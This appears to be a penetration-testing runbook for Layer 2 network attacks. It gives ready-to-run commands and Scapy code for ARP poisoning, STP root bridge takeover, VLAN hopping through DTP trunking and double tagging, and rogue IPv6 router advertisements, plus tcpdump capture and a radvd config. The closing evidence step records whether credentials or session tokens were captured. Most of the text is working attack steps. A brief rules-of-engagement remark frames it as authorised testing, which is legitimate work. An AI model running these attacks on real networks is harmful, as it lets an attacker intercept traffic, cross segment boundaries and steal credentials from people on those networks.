# Runbook: Layer 2 attacks

## Objective

Achieve man-in-the-middle positioning or access to segregated network segments through Layer 2 protocol abuse. These techniques require an existing foothold on the network segment.

## Prerequisites

- Access to a host on the target network segment (via compromised machine, direct connection, or wireless association).
- IP forwarding capability on the attack host.
- `arpspoof`, `bettercap`, or Scapy for ARP attacks; `yersinia` for STP attacks; `radvd` or `scapy` for IPv6 RA attacks.

## ARP poisoning for MitM

Enable IP forwarding so traffic continues to flow through the attacker:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Poison the victim and the gateway simultaneously:

```bash
# Using arpspoof (run both in separate terminals)
arpspoof -i eth0 -t <victim-IP> <gateway-IP>
arpspoof -i eth0 -t <gateway-IP> <victim-IP>
```

Alternatively, use bettercap for a single-command approach with integrated capture:

```bash
bettercap -iface eth0
# In bettercap REPL:
net.probe on
set arp.spoof.targets <victim-IP>
arp.spoof on
net.sniff on
```

Capture traffic through the MitM position:

```bash
tcpdump -i eth0 -w mitm-capture.pcap host <victim-IP>
```

When finished, restore the ARP cache by stopping the poisoning. Abrupt termination leaves stale entries that may cause connectivity issues; `arpspoof` sends restoration frames on SIGINT.

## STP root bridge attack

Identify the current STP topology before attacking:

```bash
# Capture STP BPDUs
tcpdump -i eth0 -e -n 'ether proto 0x0800 and ether dst 01:80:c2:00:00:00'
# Or use wireshark with filter: stp
```

Inject BPDUs claiming root bridge priority 0:

```bash
yersinia stp -attack 4 -interface eth0
```

Monitor whether STP reconverges with the attack host as root. Once confirmed, traffic between hosts on different segments will route through the attack host. The same IP forwarding and capture approach as ARP poisoning applies.

Note: STP convergence takes 30-50 seconds by default (Rapid STP is faster). During convergence the network experiences a brief outage. Confirm with the rules of engagement that this disruption is acceptable.

## VLAN hopping

Check whether the access port is in dynamic negotiation mode:

```bash
# Look for DTP frames
tcpdump -i eth0 -e -n 'ether dst 01:00:0c:cc:cc:cc'
```

If DTP is active, negotiate a trunk:

```bash
yersinia dtp -attack 1 -interface eth0
```

Once a trunk is established, create subinterfaces for each target VLAN:

```bash
modprobe 8021q
ip link add link eth0 name eth0.20 type vlan id 20
ip addr add 10.20.0.100/24 dev eth0.20
ip link set eth0.20 up
```

For double tagging (unidirectional, when trunk negotiation is not possible):

```python
from scapy.all import *
# Send a frame tagged for VLAN 20 via the native VLAN (VLAN 1)
pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst="10.20.0.1")/ICMP()
sendp(pkt, iface="eth0")
```

## IPv6 router advertisement spoofing

On any network segment where IPv6 is enabled, unsolicited Router Advertisement messages are accepted by hosts without authentication. Sending a rogue RA with a higher router preference or shorter lifetime than the legitimate router causes hosts to adopt the attacker as their IPv6 default gateway.

Check whether IPv6 is active on the segment:

```bash
# Listen for existing RA traffic
tcpdump -i eth0 -n 'icmp6 and ip6[40] == 134'
# 134 = ICMPv6 Router Advertisement type
```

Enable IPv6 forwarding:

```bash
sysctl -w net.ipv6.conf.all.forwarding=1
```

Send a rogue RA using `scapy`, setting the attacker as the preferred router and advertising a route:

```python
from scapy.all import *

# Build a Router Advertisement with high preference
ra = (
    Ether(dst="33:33:00:00:00:01") /
    IPv6(src="fe80::attacker", dst="ff02::1") /
    ICMPv6ND_RA(routerlifetime=9000, prf=1) /  # prf=1 = High preference
    ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr("eth0")) /
    ICMPv6NDOptPrefixInfo(
        prefixlen=64,
        prefix="2001:db8::",
        validlifetime=0xffffffff,
        preferredlifetime=0xffffffff
    )
)
sendp(ra, iface="eth0", loop=1, inter=5)
```

Alternatively, `radvd` can be configured to send periodic RAs:

```
# /etc/radvd.conf
interface eth0 {
    AdvSendAdvert on;
    MinRtrAdvInterval 3;
    MaxRtrAdvInterval 10;
    AdvDefaultPreference high;
    prefix 2001:db8::/64 {
        AdvOnLink on;
        AdvAutonomous on;
    };
};
```

Hosts that accept the rogue RA will configure the attacker's link-local address as their IPv6 default gateway. With IPv6 forwarding enabled and `ndp` proxying or `ip6tables` NAT configured, traffic flows through the attacker transparently.

On dual-stack networks this MitM position covers only IPv6 traffic. Combine with ARP poisoning to cover IPv4 simultaneously.

## Evidence collection

Record: which attack was used, which hosts were affected, what traffic was captured (protocols, authentication exchanges), and whether credentials or session tokens were obtained from the capture.
